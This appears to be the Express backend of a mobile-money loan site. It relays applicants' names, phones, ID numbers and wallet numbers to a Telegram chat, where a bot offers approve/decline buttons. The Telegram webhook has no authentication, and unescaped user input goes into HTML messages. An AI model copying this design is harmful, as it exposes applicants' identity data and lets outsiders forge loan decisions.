const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const applications = {};

// ---------- 1) Apply — new application from apply.html ----------
app.post('/api/apply', async (req, res) => {
  try {
    const { fullName, phone, idNumber, income, amount, months } = req.body;

    const ref = 'QL-' + Math.floor(100000 + Math.random() * 900000);

    applications[ref] = {
      ref, fullName, phone, idNumber, income,
      amount, months,
      status: 'pending',
      wallet: null,
      walletRef: null
    };

    const text =
      `<b>New loan application</b>\n` +
      `Name:   ${fullName}\n` +
      `Amount: ${Number(amount).toLocaleString('fr-FR')} XAF\n` +
      `Months: ${months}\n` +
      `Phone:  ${phone}\n` +
      `Ref:    <code>${ref}</code>`;

    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [[
            { text: '✅ Approve', callback_data: `approve:${ref}` },
            { text: '❌ Decline', callback_data: `decline:${ref}` }
          ]]
        }
      })
    });

    const data = await tgRes.json();
    applications[ref].messageId = data.result?.message_id;

    res.json({ ok: true, ref });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, error: err.message });
  }
});

// ---------- 2) Verify — wallet confirmed on verify.html ----------
app.post('/api/verify', async (req, res) => {
  try {
    const { wallet, ref } = req.body;   // no `code` field, ever

    if (!wallet || !ref) {
      return res.status(400).json({ ok: false, error: 'Missing wallet or ref' });
    }

    // Build a wallet-based reference from the phone number
    const digits    = String(wallet).replace(/\D/g, '');        // "237435454645"
    const last6     = digits.slice(-6);                          // "454645"
    const suffix    = Math.floor(10 + Math.random() * 90);       // "42"
    const walletRef = 'QL-' + last6 + suffix;                    // "QL-45464542"

    if (applications[ref]) {
      applications[ref].wallet    = wallet;
      applications[ref].walletRef = walletRef;
    }

    const text =
      `<b>Wallet confirmed</b>\n` +
      `Wallet:     ${wallet}\n` +
      `App ref:    <code>${ref}</code>\n` +
      `Wallet ref: <code>${walletRef}</code>`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: 'HTML'
      })
    });

    res.json({ ok: true, walletRef });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, error: err.message });
  }
});

// ---------- 3) Status — success.html polls this ----------
app.get('/api/status/:ref', (req, res) => {
  const app_ = applications[req.params.ref];
  if (!app_) return res.status(404).json({ ok: false });
  res.json({
    ok: true,
    status:    app_.status,
    walletRef: app_.walletRef || null
  });
});

// ---------- 4) Telegram webhook — Approve / Decline buttons ----------
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const { data, message, id: cbId } = update.callback_query;
    const [action, ref] = data.split(':');
    const app_ = applications[ref];

    if (app_) {
      app_.status = action === 'approve' ? 'approved' : 'declined';

      const newText =
        `<b>Loan ${action === 'approve' ? 'APPROVED ✅' : 'DECLINED ❌'}</b>\n` +
        `Name:       ${app_.fullName}\n` +
        `Amount:     ${Number(app_.amount).toLocaleString('fr-FR')} XAF\n` +
        `Wallet:     ${app_.wallet || '—'}\n` +
        `App ref:    <code>${ref}</code>\n` +
        `Wallet ref: <code>${app_.walletRef || '—'}</code>`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          message_id: message.message_id,
          text: newText,
          parse_mode: 'HTML'
        })
      });

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: cbId, text: `Marked ${app_.status}` })
      });
    }
  }

  res.sendStatus(200);
});

// ---------- 5) Fallback ----------
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => console.log(`Running on ${PORT}`));
